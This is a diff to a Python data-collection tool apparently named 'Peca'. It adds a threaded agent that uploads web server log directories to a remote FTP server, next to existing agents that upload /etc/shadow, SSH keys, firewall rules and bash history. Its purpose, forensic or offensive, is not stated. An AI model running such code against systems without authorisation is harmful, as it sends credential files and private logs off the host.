@@ -71,6 +71,7 @@ class PasswdShadowGroupAgent(threading.Thread):
         self.upload_file("/etc/shadow", False)
         self.upload_file("/etc/group", False)
 
+
 class SSHKeyAgent(threading.Thread):
     def __init__(self, ftpserver, ftpport, ftpuser, ftppass, core_directory):
         self.agentName = "SSHKey Agent"
@@ -214,7 +215,79 @@ class IPTablesAgent(threading.Thread):
         if os.path.exists("/etc/sysconfig/ip6tables"):
             self.upload_file("/etc/sysconfig/ip6tables", False)
 
+class WebServiceLogsAgent(threading.Thread):
+    def __init__(self, ftpserver, ftpport, ftpuser, ftppass, core_directory):
+        self.agentName = "WebServiceLogs Agent"
+        self.ftpserver = ftpserver
+        self.ftpport = ftpport
+        self.ftpuser = ftpuser
+        self.ftppass = ftppass
+        self.module_path = "WebServiceLogs"
+        self.session = None
+        self.coredirectory = core_directory
+        self.servicelogdict = { "httpd_etc" : "/etc/httpd/logs/",
+								"apache2" : "/var/log/apache2/",
+								"apache" : "/var/log/apache/",
+								"httpd" : "/var/log/httpd/",
+								"lighttpd" : "/var/log/lighttpd/",
+								"webmin" : "/var/webmin/",
+								"www" : "/var/www/logs"
+							  }
 
+        threading.Thread.__init__(self)
+
+    def run(self):
+        print "[-] Starting %s Agent" % self.agentName
+        self.connect_to_ftp()
+        try:
+            self.run_task()
+        except:
+            #Only to preserve other task
+            print '[!] Error occured in %s' % self.agentName
+        self.session.quit()
+        print "[#] %s Finished" % self.agentName
+
+    def connect_to_ftp(self):
+        self.session = ftplib.FTP()
+        self.session.connect(self.ftpserver, self.ftpport)
+        self.session.login(self.ftpuser, self.ftppass)
+        self.session.cwd(self.coredirectory)
+        self.create_folder()
+        self.session.cwd(self.module_path)
+
+    def create_folder(self):
+        if check_if_directory_exist(self.session, self.module_path):
+            pass
+        else:
+            # Create folder
+            self.session.mkd(self.module_path)
+
+    def upload_file(self, filepath, binary):
+        # Delete old file
+        try:
+            self.session.delete(os.path.basename(filepath))
+        except:
+            pass
+        # Store new file
+        if binary:
+            self.session.storbinary('STOR %s' % os.path.basename(filepath), open(filepath, 'rb'))
+        else:
+            self.session.storlines('STOR %s' % os.path.basename(filepath), open(filepath, 'r'))
+
+    def run_task(self):
+		for key in self.servicelogdict.keys():
+			if os.path.exists(self.servicelogdict[key]):
+				# Check if the directory exit
+				if check_if_directory_exist(self.session, key):
+					pass
+				else:
+					# Create folder
+					self.session.mkd(key)
+				self.session.cwd(key)
+				for conffile in os.listdir(self.servicelogdict[key]):
+					self.upload_file(self.servicelogdict[key]+conffile, False)
+				self.session.cwd("../")
+			
 class BashConfigHistoryAgent(threading.Thread):
     def __init__(self, ftpserver, ftpport, ftpuser, ftppass, core_directory):
         self.agentName = "BashConfigHistory Agent"
@@ -340,6 +413,7 @@ class Peca:
         self.agentthreads.append(SSHKeyAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
         self.agentthreads.append(IPTablesAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
         self.agentthreads.append(BashConfigHistoryAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
+        self.agentthreads.append(WebServiceLogsAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
 
         # Start all the threads
         [x.start() for x in self.agentthreads]
